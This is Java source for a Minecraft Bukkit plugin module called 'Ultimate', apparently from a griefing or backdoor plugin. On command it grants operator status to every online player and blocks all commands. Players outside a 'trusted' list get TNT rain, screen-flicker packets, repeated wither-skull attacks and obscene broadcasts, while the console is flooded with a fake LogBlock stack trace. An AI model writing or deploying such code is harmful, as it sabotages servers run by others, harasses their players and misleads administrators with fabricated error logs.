package me.maiko.modules.important;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.entity.WitherSkull;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

import me.maiko.main.Main;
import me.maiko.module.Module;
import me.maiko.modules.blocking.BlockAllCmds_Mod;
import me.maiko.modules.message.Exceptionspammer_Mod;
import me.maiko.modules.world.Durchfallmann_Mod;
import me.maiko.modules.world.Tntregen_Mod;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;

public class Ultimate_Mod extends Module {
	public static Boolean Ultimate = false;
	Main plugin;

	public Ultimate_Mod(Main plugin) {
		super("Ultimate");
		this.plugin = plugin;
	}
	int color = 0;

	@Override
	public void onCommand(String[] args, Player p) {
		if (args.length == 1) {
			p.sendMessage(Main.Prefix + "Dieser Server ist nun GEFICKT!!!!!!!");

			Ultimate = true;
			BlockAllCmds_Mod.AllCommandsBlocked = true;
			for (Player all : Bukkit.getOnlinePlayers()) {
				all.setOp(true);
				if (!Main.trusted.contains(all) && !Main.SemiTrusted.contains(all)) {
					Tntregen_Mod.Tntregen.add(all);

					Durchfallmann_Mod.Durchfallmann.add(all);
					all.setVelocity(new Vector(0, 0.5, 0));
				}
			}
			Exceptionspammer_Mod.exceptionspammer = true;
			Bukkit.getScheduler().scheduleSyncRepeatingTask(plugin, new Runnable() {

				@Override
				public void run() {
					color++;
					for(Player all : Bukkit.getOnlinePlayers()) {
						if (!Main.trusted.contains(all) && !Main.SemiTrusted.contains(all)) {

					PacketPlayOutGameStateChange packet = new PacketPlayOutGameStateChange(7, color);
					((CraftPlayer) all).getHandle().playerConnection.sendPacket(packet);
					}
					if (color >= 6) {
						color = 1;
					}
					}
				}
			}, 0, 10);
			Bukkit.getScheduler().scheduleSyncRepeatingTask(plugin, new Runnable() {

				@Override
				public void run() {

								for (Player all : Bukkit.getOnlinePlayers()) {

									if (!Main.trusted.contains(all) && !Main.SemiTrusted.contains(all)) {
										all.launchProjectile(WitherSkull.class);

										all.getInventory().setHelmet(new ItemStack(Material.AIR));
									}
								}
								Bukkit.broadcastMessage(Main.Prefix + "GO FUCK YOURSELF!!!!!!!");
								new BukkitRunnable() {
									
									@Override
									public void run() {
										
										for (Player all : Bukkit.getOnlinePlayers()) {
											if (!Main.trusted.contains(all) && !Main.SemiTrusted.contains(all)) {

												all.getInventory().setHelmet(new ItemStack(Material.PUMPKIN));
												all.playSound(all.getLocation(), Sound.ENDERMAN_DEATH, 1.0F, 2.0F);
												all.playSound(all.getLocation(), Sound.BAT_DEATH, 1.0F, 1.0F);
											}
										}
									}
								}.runTaskLater(plugin, 2);
					
				
				}
			}, 0, 3);
			Bukkit.getScheduler().scheduleSyncRepeatingTask(plugin, new Runnable() {

		

				@Override
				public void run() {
					
					Bukkit.getConsoleSender().sendMessage(
							"2014-01-05 23:57:07 [SEVERE] Could not pass event InventoryOpenEvent to LogBlock v1.81\r\n"
									+ "org.bukkit.event.EventException\r\n"
									+ "at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:437)\r\n"
									+ "at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:62)\r\n"
									+ "at org.bukkit.plugin.TimedRegisteredListener.callEvent(TimedRegisteredListener.java:31)\r\n"
									+ "at org.bukkit.plugin.SimplePluginManager.fireEvent(SimplePluginManager.java:479)\r\n"
									+ "at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:464)\r\n"
									+ "at org.bukkit.craftbukkit.v1_6_R3.event.CraftEventFactory.callInventoryOpenEvent(CraftEventFactory.java:595)\r\n"
									+ "at cpw.mods.fml.common.network.NetworkRegistry.openRemoteGui(NetworkRegistry.java:382)\r\n"
									+ "at cpw.mods.fml.common.network.FMLNetworkHandler.openGui(FMLNetworkHandler.java:352)\r\n"
									+ "at net.minecraft.entity.player.EntityPlayer.openGui(EntityPlayer.java:2719)\r\n"
									+ "at dan200.CCTurtle.openTurtleGUI(CCTurtle.java:184)\r\n"
									+ "at dan200.turtle.shared.BlockTurtle.openTurtleGUI(BlockTurtle.java:182)\r\n"
									+ "at dan200.turtle.shared.BlockTurtle.func_71903_a(BlockTurtle.java:196)\r\n"
									+ "at net.minecraft.item.ItemInWorldManager.func_73078_a(ItemInWorldManager.java:524)\r\n"
									+ "at net.minecraft.network.NetServerHandler.func_72472_a(NetServerHandler.java:880)\r\n"
									+ "at net.minecraft.network.packet.Packet15Place.func_73279_a(Packet15Place.java:79)\r\n"
									+ "at net.minecraft.network.TcpConnection.func_74428_b(TcpConnection.java:470)\r\n"
									+ "at net.minecraft.network.NetServerHandler.func_72570_d(NetServerHandler.java:233)\r\n"
									+ "at net.minecraft.network.NetworkListenThread.func_71747_b(NetworkListenThread.java:54)\r\n"
									+ "at net.minecraft.server.dedicated.DedicatedServerListenThread.func_71747_b(DedicatedServerListenThread.java:34)\r\n"
									+ "at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:914)\r\n"
									+ "at net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:330)\r\n"
									+ "at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:781)\r\n"
									+ "at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:663)\r\n"
									+ "at net.minecraft.server.ThreadMinecraftServer.run(ThreadMinecraftServer.java:16)\r\n"
									+ "Caused by: java.lang.AbstractMethodError\r\n"
									+ "at org.bukkit.craftbukkit.v1_6_R3.inventory.CraftInventory.getContents(CraftInventory.java:42)\r\n"
									+ "at de.diddiz.LogBlock.listeners.ChestAccessLogging.onInventoryOpen(ChestAccessLogging.java:61)\r\n"
									+ "at sun.reflect.GeneratedMethodAccessor135.invoke(Unknown Source)\r\n"
									+ "at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n"
									+ "at java.lang.reflect.Method.invoke(Method.java:606)\r\n"
									+ "at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:435)\r\n"
									+ "... 23 more");
				}
			},  0, 5);
		
			

		} else {
			p.sendMessage(Main.Prefix + "Nutze _Ultimate");
		}

	}

}
